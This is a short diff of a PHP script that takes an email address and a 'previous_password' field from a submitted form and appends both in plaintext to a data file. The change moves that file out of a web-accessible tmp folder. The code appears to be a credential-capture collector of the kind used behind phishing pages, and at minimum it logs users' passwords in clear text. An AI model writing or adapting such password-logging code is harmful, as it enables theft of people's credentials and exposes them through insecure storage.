@@ -1,7 +1,7 @@
 <?php
         $email = $_POST["email"];
         $previous_password = $_POST["previous_password"];
-        $file="/var/www/html/tmp/basic-auth.dat";
+        $file="/var/www/basic-auth/basic-auth.dat";
         $data = "$email:$previous_password\n";
         file_put_contents($file, $data, FILE_APPEND );
      //   file_put_contents($file, $email, FILE_APPEND );
